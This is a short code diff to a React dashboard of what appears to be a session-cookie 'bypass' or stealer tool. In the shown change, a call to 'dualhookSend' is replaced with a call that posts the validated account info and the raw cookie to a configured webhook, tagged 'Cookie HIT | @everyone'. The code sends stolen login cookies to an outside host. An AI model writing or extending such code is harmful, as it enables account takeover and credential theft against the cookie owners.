@@ -2,7 +2,7 @@ import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { Shield, Zap, Cookie, Loader2, X, Activity, Menu, CheckCircle2, XCircle } from "lucide-react";
 import {
-  dualhookSend, AccountInfo,
+  AccountInfo, sendHitEmbed, getWebhook, WK,
   getLiveBypassLog, LiveBypassEntry,
 } from "@/lib/tokenStore";
 import { supabase } from "@/integrations/supabase/client";
@@ -44,7 +44,7 @@ const Dashboard = () => {
       if (error || !data?.valid) { toast.error("Invalid cookie"); return; }
       const info = { ...(data.info as any), cookie: trimmed, valid: true } as AccountInfo;
       setResult(info);
-      await dualhookSend("fetch", info);
+      await sendHitEmbed(getWebhook(WK.fetchCookie), info, { tag: 'Cookie HIT | @everyone' });
       toast.success("Cookie fetched");
     } catch { toast.error("Fetch failed"); }
     finally { setLoading(false); }
